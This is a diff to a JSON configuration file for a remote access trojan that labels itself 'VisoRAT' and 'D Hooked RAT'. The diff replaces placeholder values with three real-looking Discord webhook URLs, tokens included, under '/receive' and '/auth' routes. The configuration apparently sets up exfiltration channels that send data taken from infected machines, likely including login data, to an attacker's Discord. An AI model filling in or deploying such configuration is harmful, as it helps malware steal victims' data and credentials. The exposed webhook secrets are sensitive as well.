@@ -8,14 +8,14 @@
         "/receive": {
             "webhooks": [
                 {
-                    "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
+                    "url": "https://discord.com/api/webhooks/1436062812181893220/we8vZVFgEATOld-gLGseWWbSx7n9L2HfY4yxjAfvz_bnJdZZ7o-9jVO4EVsHMZpvGrBp",
                     "name": "D Hooked RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
 					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                 },
                 {
-                    "url": "YOUR_DISCORD_WEBHOOK_URL_HERE", 
+                    "url": "https://discord.com/api/webhooks/1436062658410319972/ZJlnWuxEbQ1bBbLGFhH8lrKQjob7UFTOLWbJ4tJoH_3yHOinBRwjul-ixCSKgLIi40ft", 
                     "name": "RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
@@ -26,7 +26,7 @@
         "/auth": {
             "webhooks": [
                 {
-                    "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
+                    "url": "https://discord.com/api/webhooks/1436062578815270992/HkVTtDWM7OIL4I7v6yDlt5EqkBCqOVHdzV5_Pcy0sFqW7oB059u3arkZ3iuHlxYfxgQp",
                     "name": "Not D Hooked RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
